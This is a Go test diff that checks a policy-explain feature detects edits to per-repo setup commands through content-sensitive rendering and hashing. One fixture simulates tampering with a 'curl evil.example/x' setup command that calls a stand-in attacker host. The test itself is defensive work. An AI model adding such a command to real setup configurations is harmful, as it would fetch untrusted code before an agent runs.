@@ -263,7 +263,14 @@ func TestExplain_ProfilesProvenance(t *testing.T) {
 	if f.Source != SourceYAML {
 		t.Errorf("Profiles source = %q, want %q when yaml sets it", f.Source, SourceYAML)
 	}
-	if want := "2 setup / 1 readiness cmds across 1 repos"; f.Value != want {
+	want := fmt.Sprintf("1 repos / 2 setup / 1 readiness (%s)",
+		profilesHash(map[string]SetupProfile{
+			"github.com/o/r": {
+				Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
+				Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+			},
+		}))
+	if f.Value != want {
 		t.Errorf("Profiles value = %q, want %q", f.Value, want)
 	}
 
@@ -314,5 +321,87 @@ func TestExplain_DiffPolicyValueIsGlobContentSensitive(t *testing.T) {
 	// The fully-zero block still renders exactly "disabled".
 	if got := renderDiffPolicy(DiffPolicy{}); got != "disabled" {
 		t.Errorf("zero DiffPolicy = %q, want disabled", got)
+	}
+}
+
+// The rendered Profiles value feeds EffectiveHash, the divergence comparison
+// unit for `drydock policy explain`. A count-only summary would let an edit to
+// a setup command's CONTENT (pre-agent execution with egress — the
+// highest-severity surface) slip through as "in sync" whenever the counts
+// stayed equal. Pin the properties that prevent that:
+//   - equal counts, different command content → different value and hash;
+//   - repo ORDER is not semantic (maps are unordered; blocks sort by key) →
+//     identical value;
+//   - command ORDER within a repo IS semantic (`npm ci` must run before
+//     `npm run build`, so reordering is a real config change) → different value.
+func TestExplain_ProfilesValueIsCommandContentSensitive(t *testing.T) {
+	base := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+
+	// Same counts everywhere, different setup command content → must differ.
+	edited := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "ci"}, {"curl", "evil.example/x"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+	vBase, vEdited := renderProfiles(base), renderProfiles(edited)
+	if vBase == vEdited {
+		t.Errorf("equal-count configs with different setup commands rendered identically: %q", vBase)
+	}
+	fBase := []Field{{Name: "Profiles", Value: vBase}}
+	fEdited := []Field{{Name: "Profiles", Value: vEdited}}
+	if EffectiveHash(fBase) == EffectiveHash(fEdited) {
+		t.Error("EffectiveHash unchanged after a setup command edit — divergence would go undetected")
+	}
+
+	// Same content, repos inserted in the opposite order → repo order is not
+	// semantic (per-repo blocks sort by key), values must match.
+	repoReordered := map[string]SetupProfile{}
+	repoReordered["github.com/o/s"] = base["github.com/o/s"]
+	repoReordered["github.com/o/r"] = base["github.com/o/r"]
+	if v := renderProfiles(repoReordered); v != vBase {
+		t.Errorf("repo-reordered config rendered differently: %q vs %q — spurious divergence", v, vBase)
+	}
+
+	// Same commands, swapped order within one repo's setup list → execution
+	// order is significant, so this is a real change and MUST differ.
+	cmdReordered := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "run", "build"}, {"npm", "ci"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+	if v := renderProfiles(cmdReordered); v == vBase {
+		t.Errorf("reordering commands within a repo rendered identically (%q) — execution-order change would go undetected", v)
+	}
+
+	// Rendering must not have mutated the caller's config.
+	if got := base["github.com/o/r"].Setup[0][0]; got != "npm" || base["github.com/o/r"].Setup[0][1] != "ci" {
+		t.Errorf("renderProfiles mutated the caller's setup commands: first cmd now %q", got)
+	}
+	if base["github.com/o/r"].Setup[1][2] != "build" || base["github.com/o/s"].Setup[0][0] != "make" {
+		t.Error("renderProfiles mutated the caller's setup commands")
+	}
+
+	// The empty map still renders exactly "disabled".
+	if got := renderProfiles(nil); got != "disabled" {
+		t.Errorf("nil profiles = %q, want disabled", got)
+	}
+	if got := renderProfiles(map[string]SetupProfile{}); got != "disabled" {
+		t.Errorf("empty profiles = %q, want disabled", got)
 	}
 }
